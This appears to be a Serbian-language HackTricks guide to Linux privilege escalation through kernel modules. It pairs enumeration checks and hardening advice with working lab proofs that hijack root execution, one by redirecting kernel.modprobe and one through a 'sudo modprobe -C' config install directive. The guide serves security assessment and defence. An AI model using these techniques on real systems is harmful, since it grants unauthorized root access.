# Kernel moduli i zloupotreba modprobe

{{#include ../../banners/hacktricks-training.md}}

## Pogrešne konfiguracije modula kernela i njihovog učitavanja

Podrška za module kernela predstavlja oblast visokog uticaja tokom provere Linux eskalacije privilegija. Nemojte svaki izveštaj o nepotpisanom modulu smatrati dokazom mogućnosti eksploatacije, već ga iskoristite da odgovorite na praktična pitanja.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Može li trenutni korisnik da učitava module putem `sudo`, capabilities ili zapisive pomoćne putanje?
- Da li je učitavanje modula i dalje omogućeno?
- Da li je provera potpisa modula onemogućena?
- Mogu li direktorijumi modula, datoteke modula ili putanje konfiguracije `modprobe.d` da se menjaju?<sup>[[16]](#references)</sup>
- Mogu li da se čitaju dnevnici kernela kako bi se potvrdilo šta se dogodilo?

Brza početna procena počinje sledećim proverama statusa modula, potpisa, evidentiranja i stabla modula.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Tumačenje:

- `modules_disabled=1` znači da se moduli ne mogu ni učitavati ni uklanjati, a vrednost se ne može vratiti na `0` do ponovnog pokretanja sistema.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` u komandnoj liniji kernela ili `CONFIG_MODULE_SIG_FORCE=y` zahteva ispravno potpisane module; u suprotnom, nepotpisani moduli mogu da se učitaju i označe kernel kao kompromitovan.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` ne postavlja ograničenja za `dmesg`; kada je vrednost `1`, za pristup je potreban `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Putanje sa dozvolom za upis unutar `/lib/modules/$(uname -r)/` predstavljaju opasnost jer `modprobe` pretražuje to stablo i njegove podatke o zavisnostima prilikom učitavanja modula.<sup>[[8]](#references)</sup>

### Učitavanje modula i čitanje izlaza kernela

Ako imate odgovarajuću dozvolu za učitavanje lokalnog modula, `insmod` ubacuje tačno onu `.ko` datoteku koju navedete. Init funkcija modula pokreće se tokom učitavanja, a poruke zapisane pomoću `printk()` šalju se u bafer evidencije kernela, koji se obično čita pomoću `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimalni postupak provere koristi `modinfo` za pregled metapodataka, `insmod` i `rmmod` za učitavanje i uklanjanje modula, `lsmod` za potvrdu da je modul učitan i `dmesg` za pregled evidencije kernela.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Ako `sudo -l` dozvoljava `insmod`, `modprobe` ili omotač oko njih, smatrajte to kritičnim: `sudo -l` prikazuje privilegije korisnika koji je pokrenuo naredbu, a učitavanje kernel modula zahteva `CAP_SYS_MODULE`. Pogledajte [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) za direktne puteve zasnovane na capability-jima.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` dozvoljen preko sudo-a

Sudo pravilo koje korisniku dozvoljava da pokrene `insmod` nije isto što i dozvola za pokretanje uobičajenog administrativnog pomoćnog programa. Kod za inicijalizaciju modula izvršava se kao deo njegovog učitavanja, pa je ključno pitanje pri praktičnoj proveri da li taj korisnik može da izabere ili izmeni modul koji se učitava.<sup>[[3]](#references)</sup>

Sledeći generički tok provere ponavlja provere pregleda, učitavanja, stanja, evidencije i uklanjanja za modul koji se razmatra.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Ako korisnik može da obezbedi proizvoljan `.ko`, u okviru ovlašćene procene to treba tretirati kao potpunu kompromitaciju sistema. Bezbedniji operativni pristup je da se učitavanje modula ne delegira preko sudo; ako je to neizbežno, ograničite tačnu putanju, vlasništvo, dozvole, pravila potpisivanja i postupak uklanjanja.<sup>[[3]](#references)[[10]](#references)</sup>

U nastavku su prikazani minimalni izvorni kod i Makefile za bezopasan obrazac izrade modula u kontrolisanom lab okruženju; oblik `make -C /lib/modules/$(uname -r)/build M=$PWD` prati dokumentovani kbuild postupak kernela za spoljne module.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Gradite i učitavajte samo u ovlašćenoj laboratoriji; kbuild gradi eksterni modul, a komande za učitavanje i uklanjanje pozivaju interfejse kernel modula.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Provere zloupotrebe `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` navodi userspace helper koji kernel izvršava za zahteve za automatsko učitavanje modula; ovaj sysctl utiče na automatsko učitavanje, a ne na eksplicitno umetanje modula. Ako napadač može da ga promeni tako da pokazuje na izvršnu datoteku u koju može da upisuje i zatim pokrene zahtev za modul, taj helper postaje putanja do izvršavanja koda sa privilegijama. Ako se postavi na prazan string, zahtevi za automatsko učitavanje se onemogućavaju; ako je `CONFIG_STATIC_USERMODEHELPER=y`, vrednost koja nije prazna zamenjuje se putanjom statičkog helpera ugrađenog u kernel.<sup>[[1]](#references)</sup>

Proverite trenutnu putanju helpera preko kernel sysctl interfejsa i pregledajte vlasništvo nad ciljnom datotekom i njene dozvole.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Proverite da li se može uticati na sysctl, delegirana sudo pravila ili file capabilities.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Sledeći obrazac, namenjen isključivo laboratorijskom okruženju, menja putanju pomoćnog programa i pokreće dokumentovani zahtev za automatsko učitavanje modula; koristite ga samo na izolovanom sistemu za čije testiranje imate ovlašćenje.<sup>[[1]](#references)</sup>

Na aktuelnim Linux kernelima nemojte koristiti nepoznatu izvršnu datoteku kao generički okidač: nasleđeno automatsko učitavanje modula za prilagođene formate binarnih datoteka uklonjeno je u Linuxu 6.14, dok dokumentacija kernela navodi nepoznat tip sistema datoteka kao putanju zahteva za automatsko učitavanje modula.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Na ojačanim sistemima, ovo bi trebalo da ne uspe ako dozvole sprečavaju neprivilegovano pisanje u `kernel.modprobe`, ako putanja do pomoćnog programa nije upisiva ili ako je automatsko učitavanje modula onemogućeno.<sup>[[1]](#references)</sup>

### Upisiva konfiguracija `modprobe.d` i `sudo modprobe -C`

Pre nego što razreši modul, `modprobe` čita `.conf` datoteke iz konfiguracionih direktorijuma kao što su `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` i `/lib/modprobe.d`, prema redosledu prioriteta. Datoteka istog imena u direktorijumu višeg prioriteta potiskuje datoteku nižeg prioriteta. Još važnije, direktiva `install <module> <command>` izvršava proizvoljnu shell komandu **umesto** učitavanja tog modula. Zbog toga upisiva konfiguraciona putanja može omogućiti odloženo izvršavanje komande sa privilegijama kasnijeg privilegovanog pozivaoca `modprobe`; sprovođenje potpisa kernel modula ne autentifikuje ovu userspace komandu.<sup>[[16]](#references)</sup>

Proverite dozvole direktorijuma i datoteka, a zatim pregledajte efektivnu konfiguraciju. `modprobe -n -v` je bezbedan za proveru razrešavanja jer režim probnog pokretanja niti učitava modul niti izvršava komandu `install`/`remove`. Dajte prednost opciji `modprobe -c` u odnosu na zastareli zapis `--showconfig`, za koji trenutna dokumentacija kmod-a navodi da će biti uklonjen posle kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Neograničeno sudo pravilo za `modprobe` može da se iskoristi čak i kada proizvoljne `.ko` datoteke ne mogu da prođu proveru potpisa: `-C` bira direktorijum konfiguracije pod kontrolom napadača, iz kog proces pokrenut pomoću sudo može da izvrši komandu `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Za ublažavanje rizika, nemojte dozvoliti `modprobe` bez ograničenja argumenata kroz sudo, neka svaki konfiguracioni direktorijum bude u vlasništvu root-a i bez dozvole za upis, i pregledajte neočekivane direktive `install`/`remove`. Kada pouzdani administrativni postupak mora da zaobiđe takve direktive za jedan modul, `modprobe --ignore-install` ih ignoriše za taj imenovani modul, ali zavisnosti i dalje mogu imati sopstvene komande.<sup>[[8]](#references)[[16]](#references)</sup>

### Pregled direktorijuma `/lib/modules` sa dozvolom za upis

Direktorijumi modula sa dozvolom za upis mogu da omoguće zamenu modula, postavljanje zlonamernih modula ili zloupotrebu automatskog učitavanja, u zavisnosti od toga kako se `modprobe` kasnije poziva; `modprobe` pretražuje `/lib/modules/$(uname -r)` i koristi podatke o zavisnostima prilikom pronalaženja modula.<sup>[[8]](#references)</sup>

Pregledajte datoteke modula i metapodatke o zavisnostima/aliasima sa dozvolom za upis u stablu modula aktivne verzije kernela.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Ako pronađete sadržaj modula koji se može menjati, ispitajte kako `modprobe` razrešava zavisnosti i kako `modinfo` prikazuje metapodatke modula.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Odbrambene napomene:

- Obezbedite da je `/lib/modules` u vlasništvu `root:root` i da korisnici ne mogu da ga menjaju.<sup>[[8]](#references)</sup>
- Postavite `kernel.modules_disabled=1` nakon pokretanja sistema, kada je to operativno moguće.<sup>[[1]](#references)</sup>
- Nametnite potpisivanje modula na sistemima koji zahtevaju učitljive module.<sup>[[2]](#references)</sup>
- Nadgledajte upise u `/proc/sys/kernel/modprobe`, `/lib/modules` i konfiguracione direktorijume `modprobe.d`, kao i neočekivano pokretanje `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Trijaža rootkita zasnovanog na modulu

Zlonamerni modul može da presreće syscall-ove, VFS ili prikaze kroz `/proc`, mrežne putanje ili provere akreditiva kako bi sakrio procese i datoteke, preusmerio saobraćaj ili presreo tajne. Može i da se ukloni sa spiska modula koji prikazuje `lsmod`. Mehanizmi postojanosti mogu biti aliasi ili install pravila u `modprobe.d`, `/etc/modules-load.d`, systemd jedinica, sadržaj initramfs-a ili zamena legitimne `.ko` datoteke. Uobičajen rezultat komande `lsmod` predstavlja koristan dokaz, ali kompromitovanje na nivou kernela može učiniti liste koje kernel obezbeđuje nepouzdanim. Uporedite učitane module, datoteke na disku, konfiguraciju pokretanja sistema, zapise o učitavanju modula i pouzdanu telemetriju izvan sistema.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Proverite neočekivane nazive modula, putanje, zavisnosti, potpise i vreme učitavanja. Poruke o kernel taint-u i nepotpisanim modulima ukazuju na mogući problem, ali nisu dokaz rootkit-a. Ako sumnjate na rootkit, prikupite dokaze iz pouzdane slike sistema ili okruženja za oporavak pre nego što se oslonite na aktivni kernel kao izvor podataka. Stranica [procene ranjivosti kernela](kernel-vulnerability-assessment.md) obrađuje izloženost kroz konfiguraciju i dijagnostiku, uključujući tracefs i zakačene BPF objekte.

## References

- [1] [Dokumentacija za /proc/sys/kernel/ — dokumentacija Linux kernela](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mehanizam za potpisivanje modula kernela — dokumentacija Linux kernela](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Osnove upravljačkih programa — dokumentacija Linux kernela](https://docs.kernel.org/driver-api/basics.html)
- [6] [Beleženje poruka pomoću printk — dokumentacija Linux kernela](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Izgradnja eksternih modula — dokumentacija Linux kernela](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Spoji oznaku 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
